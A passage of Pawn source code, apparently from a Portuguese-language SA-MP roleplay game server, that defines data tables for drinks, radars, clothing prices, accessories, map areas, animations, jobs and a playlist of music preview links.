	{"Refrigerante",    		20,		SPECIAL_ACTION_DRINK_SPRUNK},
	{"Cerveja",    				20,		SPECIAL_ACTION_DRINK_BEER},
	{"Whisky",    				100,	SPECIAL_ACTION_DRINK_WINE}
};

new DrinkSips[MAX_SLOTS] = 0;

//Drogas
new Cigar[MAX_SLOTS] = 0;

//Radar
enum radarInfo
{
	rdRef[64],
	Float:rdX,
	Float:rdY,
	Float:rdZ,
	Float:rdRadius,
	Float:rdLimit
}

new Radar[][radarInfo] = {
	{"Las Colinas",		2263.0600,    -1147.6811,    26.8284, 	15.0, 	120.0},
	{"Commerce",		1429.1342,    -1591.8605,    13.3906, 	15.0, 	120.0},
	{"Market",			1201.6281,    -1400.4487,    13.2769, 	15.0, 	130.0},
	{"Market",			1213.7116,    -1147.6821,    23.4614, 	15.0, 	130.0},
	{"Glen Park",		1981.5328,    -1053.7968,    24.3984, 	15.0, 	120.0},
	{"El Corona",		1963.7485,    -1930.5794,    13.3828, 	15.0, 	120.0},
	{"Verdant Bluffs",	1292.9090,    -1851.4022,    13.3828, 	15.0, 	130.0}
};

new RadarFlags[MAX_SLOTS] = 0;

//Roupas
enum csOption
{
	OPTION_BUY = 0,
	OPTION_CANCEL
}

enum clothesshopInfo
{
	csType,
	csId,
	csVirtualWorld,
	csOption:csOpt
}

new ClothesShop[MAX_SLOTS][clothesshopInfo];
			 
new Clothes[][] = {
	{CLOTHES_VICTIM, 			100},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_VICTIM, 			150},
	{CLOTHES_NONE,  			0},
	{CLOTHES_DIDIER_SACHS,   	250},
	{CLOTHES_VICTIM, 			125},
	{CLOTHES_DIDIER_SACHS,  	200},
	{CLOTHES_VICTIM, 			200},
	{CLOTHES_SUB_URBAN, 		150},
	{CLOTHES_SUB_URBAN, 		150},
	{CLOTHES_VICTIM, 			150},
	{CLOTHES_NONE,  			0},
	{CLOTHES_VICTIM, 			200},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_SUB_URBAN,    		150},
	{CLOTHES_VICTIM, 			150},
	{CLOTHES_SUB_URBAN,    		175},
	{CLOTHES_SUB_URBAN,    		150},
	{CLOTHES_SUB_URBAN,    		150},
	{CLOTHES_SUB_URBAN,    		150},
	{CLOTHES_SUB_URBAN,    		150},
	{CLOTHES_PRO_LAPS,    		200},
	{CLOTHES_NONE,  			0},
	{CLOTHES_SUB_URBAN,    		200},
	{CLOTHES_SUB_URBAN,    		200},
	{CLOTHES_SUB_URBAN,    		200},
	{CLOTHES_BINCO,        		150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_VICTIM,    		150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_VICTIM,    		150},
	{CLOTHES_VICTIM,    		150},
	{CLOTHES_DIDIER_SACHS,   	200},
	{CLOTHES_VICTIM,    		150},
    {CLOTHES_NONE,  			0},
	{CLOTHES_VICTIM,    		150},
	{CLOTHES_VICTIM,    		150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_DIDIER_SACHS,   	250},
	{CLOTHES_VICTIM,    		200},
	{CLOTHES_VICTIM,    		200},
	{CLOTHES_BINCO,         	200},
	{CLOTHES_NONE,  			0},
	{CLOTHES_PRO_LAPS,    		150},
	{CLOTHES_PRO_LAPS,    		150},
    {CLOTHES_NONE,  			0},
	{CLOTHES_VICTIM, 			125},
	{CLOTHES_VICTIM, 			200},
	{CLOTHES_VICTIM,    		150},
	{CLOTHES_DIDIER_SACHS,   	300},
	{CLOTHES_VICTIM,      		150},
	{CLOTHES_DIDIER_SACHS,   	250},
	{CLOTHES_VICTIM,      		200},
	{CLOTHES_BINCO,  			250},
	{CLOTHES_BINCO,  			125},
	{CLOTHES_SUB_URBAN,    	 	150},
	{CLOTHES_SUB_URBAN,      	150},
	{CLOTHES_NONE,  			0},
	{CLOTHES_SUB_URBAN,      	150},
	{CLOTHES_SUB_URBAN,      	150},
	{CLOTHES_NONE,  			0},
	{CLOTHES_VICTIM,    		150},
	{CLOTHES_BINCO,  			150},
	{CLOTHES_NONE,  			0},
	{CLOTHES_VICTIM, 			200},
	{CLOTHES_BINCO,  			150},
	{CLOTHES_VICTIM, 			200},
	{CLOTHES_BINCO,  			150},
	{CLOTHES_NONE,  			0},
	{CLOTHES_BINCO,  			125},
	{CLOTHES_BINCO,  			125},
	{CLOTHES_BINCO,  			125},
	{CLOTHES_SUB_URBAN,      	175},
	{CLOTHES_SUB_URBAN,      	175},
	{CLOTHES_DIDIER_SACHS,   	300},
	{CLOTHES_DIDIER_SACHS,   	300},
	{CLOTHES_DIDIER_SACHS,   	300},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_SUB_URBAN,      	150},
	{CLOTHES_VICTIM,		    150},
	{CLOTHES_VICTIM,       		150},
	{CLOTHES_SUB_URBAN,      	150},
	{CLOTHES_NONE,  			0},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_VICTIM,       		150},
	{CLOTHES_VICTIM, 			125},
	{CLOTHES_VICTIM, 			125},
	{CLOTHES_PRO_LAPS,       	150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_VICTIM, 			200},
	{CLOTHES_PRO_LAPS,       	150},
	{CLOTHES_PRO_LAPS,    		150},
	{CLOTHES_VICTIM, 			150},
	{CLOTHES_SUB_URBAN, 		150},
	{CLOTHES_SUB_URBAN, 		150},
	{CLOTHES_SUB_URBAN, 		150},
	{CLOTHES_SUB_URBAN, 		150},
	{CLOTHES_SUB_URBAN, 		150},
	{CLOTHES_SUB_URBAN, 		150},
	{CLOTHES_SUB_URBAN,   		150},
	{CLOTHES_SUB_URBAN,   		150},
	{CLOTHES_SUB_URBAN,   		150},
	{CLOTHES_DIDIER_SACHS,   	350},
	{CLOTHES_DIDIER_SACHS,   	350},
	{CLOTHES_DIDIER_SACHS,   	400},
	{CLOTHES_SUB_URBAN, 		150},
	{CLOTHES_SUB_URBAN, 		150},
	{CLOTHES_SUB_URBAN, 		150},
	{CLOTHES_SUB_URBAN,   		200},
	{CLOTHES_SUB_URBAN,   		200},
	{CLOTHES_NONE,  			0},
	{CLOTHES_SUB_URBAN,   		200},
	{CLOTHES_SUB_URBAN,   		200},
	{CLOTHES_SUB_URBAN,   		200},
	{CLOTHES_SUB_URBAN,   		200},
	{CLOTHES_DIDIER_SACHS,   	300},
	{CLOTHES_DIDIER_SACHS,   	400},
	{CLOTHES_DIDIER_SACHS,   	400},
	{CLOTHES_DIDIER_SACHS,   	400},
	{CLOTHES_BINCO,    			125},
	{CLOTHES_BINCO,    			125},
	{CLOTHES_BINCO,    			125},
	{CLOTHES_BINCO,    			125},
	{CLOTHES_BINCO,    			125},
	{CLOTHES_BINCO,    			125},
	{CLOTHES_SUB_URBAN,   		125},
	{CLOTHES_SUB_URBAN,   		125},
	{CLOTHES_SUB_URBAN, 		150},
	{CLOTHES_SUB_URBAN,   		125},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_DIDIER_SACHS,   	200},
	{CLOTHES_SUB_URBAN, 		200},
	{CLOTHES_SUB_URBAN, 		200},
	{CLOTHES_SUB_URBAN, 		200},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_DIDIER_SACHS,   	300},
	{CLOTHES_DIDIER_SACHS,   	300},
	{CLOTHES_NONE,  			0},
	{CLOTHES_DIDIER_SACHS,   	300},
	{CLOTHES_VICTIM,    		150},
	{CLOTHES_SUB_URBAN,      	200},
	{CLOTHES_DIDIER_SACHS,   	200},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_NONE,  			0},
	{CLOTHES_VICTIM,    		125},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE, 		 		0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_BINCO,         	125},
	{CLOTHES_VICTIM,         	200},
	{CLOTHES_VICTIM, 			150},
	{CLOTHES_DIDIER_SACHS,  	300},
	{CLOTHES_DIDIER_SACHS,  	300},
	{CLOTHES_SUB_URBAN,  		125},
	{CLOTHES_SUB_URBAN,   		125},
	{CLOTHES_SUB_URBAN,   		125},
	{CLOTHES_SUB_URBAN,   		200},
	{CLOTHES_SUB_URBAN,      	200},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_VICTIM, 			150},
	{CLOTHES_VICTIM,    		150},
	{CLOTHES_VICTIM,    		125},
	{CLOTHES_SUB_URBAN,   		125},
	{CLOTHES_VICTIM, 			150},
	{CLOTHES_DIDIER_SACHS,   	300},
	{CLOTHES_DIDIER_SACHS,   	300},
	{CLOTHES_DIDIER_SACHS,  	300},
	{CLOTHES_VICTIM, 			150},
	{CLOTHES_DIDIER_SACHS,   	300},
	{CLOTHES_VICTIM,   			150},
	{CLOTHES_VICTIM,  			150},
	{CLOTHES_PRO_LAPS,  		150},
	{CLOTHES_VICTIM,  			150},
	{CLOTHES_DIDIER_SACHS,  	200},
	{CLOTHES_SUB_URBAN,   		150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_PRO_LAPS,       	250},
	{CLOTHES_PRO_LAPS,       	250},
	{CLOTHES_NONE,  			0},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_SUB_URBAN,      	150},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_VICTIM,  			150},
	{CLOTHES_VICTIM,  			200},
	{CLOTHES_BINCO,  			200},
	{CLOTHES_BINCO,  			200},
	{CLOTHES_DIDIER_SACHS,  	300},
	{CLOTHES_VICTIM,  			150},
	{CLOTHES_DIDIER_SACHS,  	300},
	{CLOTHES_VICTIM,  			200},
	{CLOTHES_VICTIM,  			150},
	{CLOTHES_DIDIER_SACHS,  	200},
	{CLOTHES_SUB_URBAN,      	150},
	{CLOTHES_SUB_URBAN,      	150},
	{CLOTHES_VICTIM,  			150},
	{CLOTHES_VICTIM,  			150},
	{CLOTHES_DIDIER_SACHS,   	200},
	{CLOTHES_VICTIM,  			150},
	{CLOTHES_VICTIM,  			150},
	{CLOTHES_DIDIER_SACHS,  	300},
	{CLOTHES_DIDIER_SACHS,  	300},
	{CLOTHES_VICTIM,      		200},
	{CLOTHES_SUB_URBAN,      	125},
	{CLOTHES_VICTIM,  			150},
	{CLOTHES_VICTIM,  			150},
	{CLOTHES_VICTIM,  			200},
	{CLOTHES_VICTIM,  			150},
	{CLOTHES_VICTIM,  			150},
	{CLOTHES_VICTIM,  			150},
	{CLOTHES_SUB_URBAN,      	200},
	{CLOTHES_SUB_URBAN,      	150},
	{CLOTHES_SUB_URBAN,      	125},
	{CLOTHES_DIDIER_SACHS,  	300},
	{CLOTHES_SUB_URBAN,      	150},
	{CLOTHES_SUB_URBAN,      	150},
	{CLOTHES_SUB_URBAN,      	150},
	{CLOTHES_SUB_URBAN,      	200},
	{CLOTHES_SUB_URBAN,      	150},
	{CLOTHES_SUB_URBAN,     	200},
	{CLOTHES_PRO_LAPS,    		150},
	{CLOTHES_PRO_LAPS,    		200},
	{CLOTHES_DIDIER_SACHS,   	300},
	{CLOTHES_VICTIM,      		150},
	{CLOTHES_BINCO,         	150},
	{CLOTHES_BINCO,         	50},
	{CLOTHES_NONE,  			0},
	{CLOTHES_PRO_LAPS,    		150},
	{CLOTHES_NONE,  			0},
	{CLOTHES_SUB_URBAN,    		150},
	{CLOTHES_SUB_URBAN,    		150},
	{CLOTHES_PRO_LAPS,    		200},
	{CLOTHES_PRO_LAPS,    		200},
	{CLOTHES_NONE,  			0},
	{CLOTHES_VICTIM,      		150},
	{CLOTHES_VICTIM,      		125},
	{CLOTHES_DIDIER_SACHS,  	250},
	{CLOTHES_BINCO,  			150},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_SUB_URBAN,      	200},
	{CLOTHES_SUB_URBAN,      	200},
	{CLOTHES_SUB_URBAN,      	200},
	{CLOTHES_SUB_URBAN,      	200},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_NONE,  			0},
	{CLOTHES_VICTIM,      		150},
	{CLOTHES_VICTIM,      		150},
	{CLOTHES_VICTIM,      		150},
	{CLOTHES_SUB_URBAN,      	100},
	{CLOTHES_DIDIER_SACHS,   	300},
	{CLOTHES_DIDIER_SACHS,   	300},
	{CLOTHES_DIDIER_SACHS,   	200},
	{CLOTHES_VICTIM,      		200},
	{CLOTHES_VICTIM,      		150},
	{CLOTHES_VICTIM,      		150}
};

new Float:ClothesShopCameras[][7] = {
	{0.0,         0.0,         0.0,          0.0,        0.0,         0.0,         0.0},
    {218.2123,    -98.5011,    1005.2578,    88.1192,    215.4124,    -101.0918,   1005.2578},
    {215.4867,    -41.1101,    1002.0234,    91.8792,    211.6992,    -41.1766,    1002.0234},
    {199.8162,    -126.9937,   1003.5151,    179.9267,   198.5759,    -129.7743,   1003.5151},
    {204.4486,    -8.0266,     1005.2109,    273.7592,   208.0545,    -8.2928,     1006.1716},
    {216.4141,    -155.4567,   1000.5234,    90.9392,    214.0234,    -157.3846,   1000.5234}
};

//Acessórios
enum accessoryInfo
{
	accessoryName[32],
	accessoryValue,
	accessoryObject,
	accessoryBone,
	accessoryType
}

new Accessories[][accessoryInfo] = {
	{NULL},
	{"Cluckin Bell",			100,	19137,		2,		ACCESSORY_TYPE_HAT},
	{"Óculos vermelho",			50,		19006,		2,		ACCESSORY_TYPE_GLASSES},
	{"Óculos laranja",			50,		19007,		2,		ACCESSORY_TYPE_GLASSES},
	{"Óculos verde",			50,		19008,		2,		ACCESSORY_TYPE_GLASSES},
	{"Óculos azul",				50,		19009,		2,		ACCESSORY_TYPE_GLASSES},
	{"Óculos roxo",				50,		19010,		2,		ACCESSORY_TYPE_GLASSES},
	{"Contra Baixo",			400,	19317,		1,		ACCESSORY_TYPE_GUITAR},
	{"Guitarra Flying V",		400,	19318,		1,		ACCESSORY_TYPE_GUITAR},
	{"Guitarra Warlock",		400,	19319,		1,		ACCESSORY_TYPE_GUITAR}
};

new AccessoryType[MAX_SLOTS] = 0;

//Areas
enum areaInfo
{
	areaName[64],
	areaId,
	Float:areaRadi,
	Float:areaX,
	Float:areaY,
	Float:areaZ,
	areaMapIconId,
	areaPickupId,
	areaGangZone
}

new Areas[][areaInfo] = {
	{"Hospital", 			AREA_HOSPITAL, 			10.0, 		327.9709,    	-1513.6151,    	36.0390,	22,		1240},
	{"Hospital", 			AREA_HOSPITAL, 			10.0, 		1172.8804,    	-1323.5629,    	15.3993,	22,		1240},
	{"Hospital", 			AREA_HOSPITAL, 			10.0, 		2024.9023,    	-1402.1883,    	17.2065,	22,		1240},
	{"Hospital", 			AREA_HOSPITAL, 			10.0, 		207.6657,    	-61.7010,    	1.9765,		22,		1240},
	{"Hospital", 			AREA_HOSPITAL, 			10.0, 		1241.8580,    	326.7163,    	19.7555,	22,		1240},
	{"Hospital", 			AREA_HOSPITAL, 			10.0, 		659.9813,    	-520.6640,    	16.3359,	22,		1240},
	{"Virtual Shop",      	AREA_MOD_SHOP,         	10.0,       1653.8280,		-1837.3652,		14.0000,    27,     3096},
	{"Oficina", 			AREA_CUSTOM_SHOP, 		12.0,		2129.3134,    	-1135.6182,    	25.6255,	63,     3096},
	{"Oficina", 			AREA_CUSTOM_SHOP, 		12.0,		260.9775,    	7.6689,    		2.4417,		63,     3096},
	{"Oficina", 			AREA_CUSTOM_SHOP, 		12.0,		1404.8973,    	458.6490,    	20.2168,	63,     3096},
	{"Oficina",             AREA_CUSTOM_SHOP,       12.0,       855.1235,    	-593.5686,    	18.0282,    63,     3096},
	{"Oficina",             AREA_CUSTOM_SHOP,       12.0,       1598.7768,    	-1802.9831,    	13.3746,    63,     3096},
	{"Oficina",             AREA_CUSTOM_SHOP,       12.0,       483.8835,    	-1325.2572,    	15.4953,    63,     3096},
	{"Oficina",             AREA_CUSTOM_SHOP,       12.0,       690.8410,    	-1567.7020,    	14.2421,    63,     3096},
	{"Posto",               AREA_GAS_STATION,   	15.0,		1942.3759,    	-1772.7578,    	13.6406,	55},
	{"Posto",               AREA_GAS_STATION,   	15.0,		1003.9216,    	-937.5537,    	42.3281,	55},
	{"Posto",               AREA_GAS_STATION,      	15.0,       -90.9226,    	-1168.8415,    	2.4227,     55},
	{"Posto",               AREA_GAS_STATION,      	15.0,       656.1854,    	-564.7796,    	16.3359,    55},
	{"Posto",               AREA_GAS_STATION,      	15.0,       1382.0061,    	460.2639,    	20.3452,    55},
	{"Posto",               AREA_GAS_STATION,      	15.0,       70.4829,    	1218.4106,    	18.8125,    55},
	{"Posto",               AREA_GAS_STATION,      	15.0,       -1676.2385,    	412.3391,    	7.1796,    	55},
	{"Posto",               AREA_GAS_STATION,      	15.0,       -2410.5541,    	977.4781,    	45.4609,    55},
	{"Posto",               AREA_GAS_STATION,      	15.0,       -1471.6276,    	1863.4852,    	32.6328,    55},
	{"Posto",               AREA_GAS_STATION,      	20.0,       615.6032,    	1690.2250,    	6.9921,    	55},
	{"Posto",               AREA_GAS_STATION,      	15.0,       2201.4909,    	2473.7011,    	10.8203,    55},
	{"Posto",               AREA_GAS_STATION,      	15.0,       -1606.2880,    	-2713.9013,    	48.5334,    55},
	{"Posto",               AREA_GAS_STATION,      	15.0,       -2244.0751,    	-2561.2456,    	31.9218,    55},
	{"Area de Transporte",  AREA_TRAILER,           25.0,       2224.9030,    	-2233.1315,    	13.5468,    51},
	{"Desmanche",           AREA_CHOP,              10.0,       2529.5571,    	-1713.4477,    	13.4768,    55},
	{"Auto Escola",         AREA_HABT,              15.0,       1794.0998,    	-2071.1218,    	13.5751,    36},
	{"Escola Nautica",      AREA_HABN,              15.0,       723.4153,    	-1492.4016,    	1.9343,    	36},
	{"Escola Aerea", 		AREA_HABA,              15.0,       1961.4064,    	-2205.3679,    	13.5468, 	36},
	{"Pesca", 				AREA_FISH,          	320.0,      544.4256,    	-2177.3381,    	35.7031, 	9,		0,			true},
	{"Area de Plantio",    	AREA_FARM,              200.0,      -1094.9844,		-984.0151,		129.2187,	19,		0,			true},
	{"Sorveteria",          AREA_ICE_CREAM,         15.0,       1567.4921,		-1891.5528,		13.5593,    17},
	{"IML",                 AREA_IML,               15.0,       935.0521,		-1085.6365,		24.2890,    23},
	{"Cimentaria",          AREA_CEMENT,			15.0,       2422.1748,    	-2462.1472,    	13.6250,    11},
	{"Companhia Eletrica",  AREA_POST,              15.0,       2700.3791, 		-1962.6373,		13.5468,    56}
};

new Area[MAX_SLOTS] = 0;
new AreasGangZones;

//Ambience Sounds
enum ambiencesoundInfo
{
	asURL[256],
	Float:asX,
	Float:asY,
	Float:asZ,
	Float:asRadi
}

new AmbienceSounds[][ambiencesoundInfo] = {
	{"http://dc217.4shared.com/img/1074836992/46752a5a/dlink__2Fdownload_2FAbUAQPLk_3Ftsid_3D20120112-160432-3c73e7cb/preview.mp3",			2270.4040,		-1033.3256,		51.8770,	30.0},
	{"http://dc393.4shared.com/img/1074820000/6e63bddc/dlink__2Fdownload_2F8bd79ZDV_3Ftsid_3D20120112-155832-6e53aaf0/preview.mp3",			2153.6623,    	-1013.4657,    	62.9489,	30.0}
};

new AmbienceSound[MAX_SLOTS] = 0;

//Ações
enum actionInfo
{
	actionCmd[128],
	actionLib[64],
	actionName[64],
	actionLoop
}

new Actions[][actionInfo] = {
	{"/falar",              "PED",				"IDLE_CHAT",				true},
	{"/apontararma",        "PED",				"ARRESTgun",				false},
	{"/exibirse",           "GYMNASIUM",		"gym_tread_celebrate",		true},
	{"/sentar [1-7]",		"BEACH",			"ParkSit_M_loop",			true},
	{"",            		"SUNBATHE",			"ParkSit_W_in",				false},
	{"",            		"HAIRCUTS",			"BRB_Sit_In",				false},
	{"",            		"FOOD",				"FF_Sit_Eat1",				false},
	{"",            		"FOOD",				"FF_Sit_Eat2",				false},
	{"",            		"FOOD",				"FF_Sit_Eat3",				false},
	{"",            		"MISC",				"SEAT_LR",					false},
	{"/deitar [1-6]",     	"INT_HOUSE",		"BED_In_L",					false},
	{"",            		"INT_HOUSE",		"BED_In_R",					false},
	{"",            		"INT_HOUSE",		"BED_Loop_L",				false},
	{"",            		"INT_HOUSE",		"BED_Loop_R",				false},
	{"",            		"INT_HOUSE",		"BED_Out_L",				false},
	{"",            		"INT_HOUSE",		"BED_Out_R",				false},
	{"/caminhar [1-9]",   	"PED",				"WALK_gang1",				true},
	{"",                    "PED",				"WALK_gang2",				true},
	{"",                    "FAT",				"FatWalk",					true},
	{"",                    "POOL",				"POOL_Walk",				true},
	{"",                    "PED",				"WALK_armed",				true},
	{"",                    "MUSCULAR",			"MuscleWalk",				true},
	{"",                    "PED",				"WOMAN_walksexy",			true},
	{"",                    "PED",				"WOMAN_walkpro",			true},
	{"",                    "PED",				"WOMAN_walknorm",			true},
	{"/correr [1-5]",       "PED",				"sprint_civi",				true},
	{"",                    "PED",				"sprint_panic",				true},
	{"",                    "PED",				"Sprint_Wuzi",				true},
	{"",                    "PED",				"swat_run",					true},
	{"",                    "FAT",				"FatSprint",				true}
};

//Empregos
enum jobInfo
{
	jobName[64],
	jobPayday,
	jobColour,
	jobLevel,
	jobHabT,
	jobHabN,
	jobHabA,
	jobSkins[4]
}

new Jobs[][jobInfo] = {
    {NULL},
	{"Desempregado",			0,			COLOUR_UNEMPLOYED,				0,		0,	0,	0,		{0}},
	{"Pescador",   				500,    	COLOUR_FISHER, 					0,		0,	0,	0,		{0}},
	{"Taxista",         		600,    	COLOUR_CABBIE,          		0,		1,	0,	0,		{0}},
	{"Barman",          		500,    	COLOUR_BARMAN,           		0,		0,	0,	0,		{171, 189}},
	{"Pizzaboy",            	600,    	COLOUR_PIZZABOY,         		0,		1,	0,	0,		{155, 209}},
	{"Maquinista",   			600,    	COLOUR_MACHINIST, 				0,		1,	0,	0,		{0}},
	{"Lixeiro",                 500,        COLOUR_GARBAGE,                 10,     1,  0,  0,      {16}},
	{"Agricultor",   			500,    	COLOUR_FARMER, 					10,		0,	0,	0,		{157, 158, 159, 161}},
	{"Caminhoneiro",            600,        COLOUR_TRUCKER,            		20,		1,	0,	0,		{0}},
	{"Jornalista",              700,    	COLOUR_JOURNALIST,             	20,		1,	0,	1,		{0}},
	{"Piloto",    				1000,    	COLOUR_PILOT, 					30,		0,	0,	1,		{61}},
	{"Contrabandista",    		800,    	COLOUR_SMUGGLER, 				30,		1,	0,	0,		{111, 112}},
	{"Mecanico",                600,    	COLOUR_MECHANIC,             	40,		1,	0,	0,		{50,  268}},
	{"Paramedico",      		700,    	COLOUR_PARAMEDIC,       		40,		1,	0,	0,		{274, 275, 276}},
	{"Segurança",               800,    	COLOUR_SECURITY,             	40,		0,	0,	0,		{163, 164, 165, 166}},
	{"Motorista Particular",    1000,    	COLOUR_DRIVER,       			40,		1,	0,	0,		{255}},
	{"Vendedor de Armas",    	800,    	COLOUR_ARM_DEALER, 				50,		0,	0,	0,		{179}},
	{"Policial Militar",    	600,    	COLOUR_POLICE, 					50,		1,	0,	0,		{280, 281, 282}},
	{"Advogado",                1000,	    COLOUR_LAWYER,                  60,		0,	0,	0,		{0}},
	{"Traficante",          	1000,   	COLOUR_DRUG_DEALER,       		70,		0,	0,	0,		{28,  29,  30}},
	{"Policial SWAT",       	1500,   	COLOUR_SWAT,    				70,		1,	0,	1,		{285}},
	{"Delegado",            	3000,   	COLOUR_DELEGATE,         		100,	1,	0,	1,		{125, 126}},
	{"Juiz",                    4000,   	COLOUR_JUDGE,                 	100,	0,	0,	0,		{187}}
};

//Submissões
new Submission[SUBMISSION_MAX] = {INVALID_PLAYER_ID, ...};
new DiscoTimer;
new FunkTimer;
new DiscoTickCount;
new FunkTickCount;
new DiscoMusicTimer;
new FunkMusicTimer;
new CurrentSong;
new CurrentFunk;
new IceCream = 0;
new Drugs = 0;
new Bodies = 0;
new Cement = 0;
new Posts = 0;

enum songInfo
{
	songName[128],
	songURL[256],
	songGenre[32],
	songTime
}

new DiscoSongs[][songInfo] = {
	{"Chris Brown ft. Benny Benassi - Beautiful People",										"http://dc243.4shared.com/img/1070407816/f492f7a1/dlink__2Fdownload_2FPCHB2e69_3Ftsid_3D20120110-044416-635b6218/preview.mp3",		"Dance",			227},
	{"Moony - I Don't Know Why",                                                                "http://dc435.4shared.com/img/1072271599/72a18293/dlink__2Fdownload_2FckbFbpPG_3Ftsid_3D20120111-051453-ec3cdeac/preview.mp3",     	"Dance",       	 	230},
	{"James Kakande - You You You",                                                             "http://dc353.4shared.com/img/1072328396/9827f0ef/dlink__2Fdownload_2F76v2V8o8_3Ftsid_3D20120111-060743-2c8af8f6/preview.mp3",     	"Dance",        	229},
	{"Tiesto & Christian Burns - In The Dark",                                                  "http://dc262.4shared.com/img/1072330863/9b54f611/dlink__2Fdownload_2Fa62-1eH9_3Ftsid_3D20120111-060825-728f4a64/preview.mp3",     	"Dance",        	231},
	{"Carlo Dalanesse ft. Fabio Castro - Monday",                                               "http://dc239.4shared.com/img/1072273255/78e45fba/dlink__2Fdownload_2FHy_5FOEQ7x_3Ftsid_3D20120111-051600-e1605e5e/preview.mp3",    "Dance",        	217},
	{"Various - The World Is Mine",                                                             "http://dc312.4shared.com/img/1072283208/f9724093/dlink__2Fdownload_2FB7pF_5Fnjq_3Ftsid_3D20120111-052939-b2d26e80/preview.mp3",    "Dance",        	218},
	{"Various - Free",                                                                          "http://dc405.4shared.com/img/1072282173/9b1bd6e0/dlink__2Fdownload_2FDazYvaU1_3Ftsid_3D20120111-052632-c78c9788/preview.mp3",     	"Dance",        	188},
	{"Various - Lola's Theme",                                                                  "http://dc473.4shared.com/img/1072284321/2e8dc83b/dlink__2Fdownload_2FCRijhSdY_3Ftsid_3D20120111-053207-576d679f/preview.mp3",     	"Dance",        	205},
	{"Michael Jackson - Billie Jean",                       									"http://dc468.4shared.com/img/1072112913/48d63001/dlink__2Fdownload_2Fsuf6Vfam_3Ftsid_3D20120111-025647-682d98ee/preview.mp3",		"Pop",				294},
	{"Michael Jackson - Beat It",                       										"http://dc356.4shared.com/img/1072114698/39ea7b60/dlink__2Fdownload_2FQD6r6c2E_3Ftsid_3D20120111-025751-d3c6ba17/preview.mp3",		"Pop",				259},
	{"Michael Jackson - Thriller",                       										"http://dc229.4shared.com/img/1072066181/8f17233e/dlink__2Fdownload_2FdhjjI5Zi_3Ftsid_3D20120111-025609-f195b1c/preview.mp3",		"Pop",				312},
	{"Moldova - Eurovision (Epic Sax Guy Edition)",                                             "http://dc443.4shared.com/img/1082324327/9f22b4a6/dlink__2Fdownload_2FnKkk0BkT_3Ftsid_3D20120116-212504-315bb47d/preview.mp3",      "Electropop",       246},
	{"The Naked And Famous - Punching In A Dream",                                              "http://dc363.4shared.com/img/1072169185/1b4524d4/dlink__2Fdownload_2F1scVJrnj_3Ftsid_3D20120111-034124-3c4e1c04/preview.mp3",     	"Electropop",   	215},
	{"Ronny K. - Unstoppable",                           									    "http://dc440.4shared.com/img/1072156110/a52e0194/dlink__2Fdownload_2FI58Earza_3Ftsid_3D20120111-033445-b1ec391c/preview.mp3",     	"Trance",       	400},
	{"Alex M.O.R.P.H. & Van Eyden pres. Lexwood - I Love Trance (Activa's Airflow Mix)",        "http://dc243.4shared.com/img/1072153788/4964be6f/dlink__2Fdownload_2FRiOv9_5FMV_3Ftsid_3D20120111-033343-921b4366/preview.mp3",    "Trance",       	485},
    {"Bob Sinclair - World Hold On",                       										"http://dc179.4shared.com/img/1072132682/9f8faf83/dlink__2Fdownload_2FnhIAUp4R_3Ftsid_3D20120111-031132-6a6f4bd6/preview.mp3",		"House",			196},
    {"Bob Sinclair - Love Generation",                     										"http://dc176.4shared.com/img/1072134249/868ace07/dlink__2Fdownload_2FWzK7nCGZ_3Ftsid_3D20120111-031049-8f958bb/preview.mp3",		"House",			290},
	{"Ultra Nate - Free",                                   									"http://dc123.4shared.com/img/1072151627/88ffe9c8/dlink__2Fdownload_2Ftu6ROGC6_3Ftsid_3D20120111-032503-6d5fdfe0/preview.mp3",     	"House",        	216},
	{"Kaskade & Deadmau5 - Move For Me",                                                        "http://dc457.4shared.com/img/1072146928/b3aba26d/dlink__2Fdownload_2FDTevH3MO_3Ftsid_3D20120111-032212-56d7da0c/preview.mp3",     	"House",        	239},
